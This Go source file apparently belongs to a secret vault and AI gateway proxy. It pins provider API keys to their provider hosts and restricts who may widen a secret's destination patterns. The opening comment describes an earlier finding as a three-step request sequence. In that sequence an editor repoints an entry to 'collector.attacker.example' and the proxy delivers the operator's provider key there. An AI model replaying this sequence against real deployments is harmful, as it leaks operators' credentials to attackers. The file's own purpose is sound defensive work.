package handlers

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"sort"
	"strings"
)

// Where a secret is DELIVERED is a different question from who may edit the
// entry that holds it, and this file is the answer to the first one.
//
// The round-2 fix put every LLM provider call behind an inference allowlist
// keyed by the provider's API HOST. The gate held, so the next reviewer moved
// the host instead of the path: an accepted collection editor (a role a
// public-signup vault_only account can hold) rewrote the entry's
// destination_patterns through PUT /api/vault/{id} and drove /proxy, and the
// bridge delivered the OPERATOR's decrypted provider key, in cleartext, to a
// host of their choosing.
//
//	PUT /api/vault/{id} {"destination_patterns":["collector.attacker.example/*"]} -> 200
//	POST /api/secrets/issue {"secret":"team-openai"}                              -> 201
//	POST /proxy/collector.attacker.example/collect                                -> 200
//	     wire: Authorization: Bearer sk-openai-OPERATOR-KEY
//
// The allowlist was not wrong, it was pointed at the wrong thing: it constrained
// the ROUTE while the caller owned the DESTINATION. Two rules close that, and
// both live here so they cannot drift apart:
//
//   - a PIN. An entry an admin wired into the AI gateway (settings ai_key_openai
//     / ai_key_anthropic, an admin-only write) may only ever be delivered to
//     that provider's own API host. The pin is derived from an admin-only
//     settings row plus a compile-time host table, so it is not attacker-
//     writable at all, and it is enforced at DELIVERY, which is the only place
//     that cannot be routed around by a second writer of the column.
//   - a WIDENING right. Anybody with manage on an entry may NARROW where its
//     secret may go (narrowing is how agent access is revoked). Widening it, or
//     adding a host that was not there, takes more than manage: the entry's
//     creator (the principal who deposited the plaintext) or an instance admin.
//     See VaultHandler.mayDirectSecretEgress.
//
// Why both: the pin alone would leave every OTHER shared secret repointable by
// an editor, and the widening right alone would still trust one column that
// several code paths write. A caller who can edit an entry must not thereby
// control where that entry's secret is delivered.

// settingReader is the one read the pin needs. Both *db.Queries and a
// transaction-scoped *db.Queries satisfy it, which matters: a caller holding the
// SQLite write lock must pass its qtx rather than reaching for the pool (see the
// 5.3s stall documented on seedCapabilityDefaults).
type settingReader interface {
	GetSetting(ctx context.Context, key string) (string, error)
}

// egressPin is the set of hosts one vault entry's secret may be delivered to
// because the instance itself points at that entry. An empty pin means the entry
// is not wired into the AI gateway and this rule says nothing about it.
type egressPin struct {
	// hosts are the provider API hosts, lowercased, in a deterministic order.
	hosts []string
	// settings are the ai_key_* keys that produced the pin, for the refusal
	// message: the operator has to be told which knob to turn.
	settings []string
}

func (p egressPin) pinned() bool { return len(p.hosts) > 0 }

// allowsHost reports whether a live request host is inside the pin. It
// normalizes exactly the way the inference allowlist does (lowercase, explicit
// port stripped) so a host spelling that the allowlist would accept cannot be
// refused here and vice versa. Anything else, including a trailing-dot FQDN, is
// simply not equal to a pinned host and is therefore refused.
func (p egressPin) allowsHost(host string) bool {
	h := providerAPIHost(host)
	for _, pinned := range p.hosts {
		if h == pinned {
			return true
		}
	}
	return false
}

// allowsPattern reports whether a stored destination PATTERN stays inside the
// pin. The host part of a pattern is a literal (ValidateDestinationPatterns
// refuses host wildcards), so this is the same question as allowsHost.
func (p egressPin) allowsPattern(pattern string) bool {
	host, _ := splitHostPath(strings.TrimSpace(pattern))
	return p.allowsHost(host)
}

// describe renders the pin for an error message.
func (p egressPin) describe() string {
	return fmt.Sprintf("%s (wired as %s)", strings.Join(p.hosts, ", "), strings.Join(p.settings, ", "))
}

// providerPinFor returns the egress pin for a vault entry.
//
// The source of truth is the settings table, written only by PUT
// /api/settings/ai behind AdminOnly, joined to aiProviders, whose apiHost values
// are compile-time constants. Neither is reachable by a collection editor, which
// is the whole point: the ceiling column is editable by design (an operator has
// to be able to narrow it), so the rule that a provider key never leaves its
// provider cannot be stored there.
//
// A read error is returned, never swallowed. Callers deny on it. Treating a
// database error as "not pinned" is how a guard silently stops guarding, and
// this one stands between a decrypted provider key and an attacker-named host.
func providerPinFor(ctx context.Context, q settingReader, entryID string) (egressPin, error) {
	var pin egressPin
	if entryID == "" {
		return pin, nil
	}
	// A missing reader is an ERROR, not an empty pin. NewCapabilityHandler always
	// sets one; a handler assembled by hand (a test fixture, a future refactor)
	// would otherwise disable the pin silently, which is the exact shape of every
	// guard in this tree that stopped guarding without anybody noticing.
	if q == nil {
		return egressPin{}, errors.New("no settings reader: the provider egress pin cannot be resolved")
	}
	for _, name := range sortedAIProviderNames() {
		p := aiProviders[name]
		value, err := q.GetSetting(ctx, p.settingKey)
		if errors.Is(err, sql.ErrNoRows) {
			continue // provider not configured on this instance
		}
		if err != nil {
			return egressPin{}, fmt.Errorf("read setting %s: %w", p.settingKey, err)
		}
		if value != "" && value == entryID {
			pin.hosts = append(pin.hosts, p.apiHost)
			pin.settings = append(pin.settings, p.settingKey)
		}
	}
	return pin, nil
}

// sortedAIProviderNames keeps pin contents deterministic. Map iteration order
// would otherwise leak into error messages and test expectations.
func sortedAIProviderNames() []string {
	names := make([]string, 0, len(aiProviders))
	for name := range aiProviders {
		names = append(names, name)
	}
	sort.Strings(names)
	return names
}

// firstDestinationOutsidePin returns the first destination pattern that leaves
// the pin, if any.
func firstDestinationOutsidePin(pin egressPin, dests []string) (string, bool) {
	if !pin.pinned() {
		return "", false
	}
	for _, d := range dests {
		if !pin.allowsPattern(d) {
			return d, true
		}
	}
	return "", false
}

// destinationCovers reports whether ceiling pattern c already allows everything
// candidate pattern n allows, i.e. storing n instead of c is not a widening.
//
// It deliberately mirrors capability.patternMatch's grammar (a single trailing
// "/*", or a bare prefix that also covers its sub-paths) rather than inventing a
// second one: the matcher decides what a stored pattern actually permits, so a
// coverage test that is more generous than the matcher would authorise a
// widening the matcher then honours.
//
// A ceiling pattern whose HOST is wildcarded covers nothing, because destMatches
// refuses to honour those rows at match time. Without this, one legacy
// "*.supabase.co/*" row would authorise adding any host at all.
func destinationCovers(c, n string) bool {
	c = strings.ToLower(strings.TrimSpace(c))
	n = strings.ToLower(strings.TrimSpace(n))
	if c == "" || n == "" {
		return false
	}
	if hostIsWildcarded(c) {
		return false
	}
	cHost, cPath := splitHostPath(c)
	nHost, nPath := splitHostPath(n)
	if cHost != nHost {
		return false
	}
	return pathGlobCovers(cPath, nPath)
}

// pathGlobCovers answers the same question for the path halves, with "" and "/*"
// both meaning "the whole host".
func pathGlobCovers(c, n string) bool {
	if c == "" || c == "/" || c == "/*" {
		return true
	}
	if strings.HasSuffix(c, "/*") {
		prefix := strings.TrimSuffix(c, "/*")
		// The candidate may be a literal under the prefix, or a narrower glob
		// under it. "/v1/*" covers "/v1/chat" and "/v1/chat/*", not "/v2/x".
		nBase := strings.TrimSuffix(n, "/*")
		return nBase == prefix || strings.HasPrefix(nBase, prefix+"/")
	}
	// A literal ceiling also covers its sub-paths, because that is what
	// capability.patternMatch does with a pattern that has no trailing glob.
	if n == c {
		return true
	}
	if strings.HasSuffix(n, "/*") {
		// A glob is only covered by a literal when everything it can expand to
		// is under that literal, which the matcher treats as a prefix.
		return strings.HasPrefix(strings.TrimSuffix(n, "/*")+"/", c+"/")
	}
	return strings.HasPrefix(n, c+"/")
}

// widenedDestinations returns the patterns in next that the current ceiling does
// not already cover. Empty means the write only narrows or reorders, which
// anybody with manage may do: narrowing (and clearing) is how an operator
// revokes an agent's access to one secret, and putting that behind a stricter
// right would take away the only revocation lever the product offers.
func widenedDestinations(current, next []string) []string {
	var widened []string
	for _, n := range next {
		if strings.TrimSpace(n) == "" {
			continue
		}
		covered := false
		for _, c := range current {
			if destinationCovers(c, n) {
				covered = true
				break
			}
		}
		if !covered {
			widened = append(widened, n)
		}
	}
	return widened
}
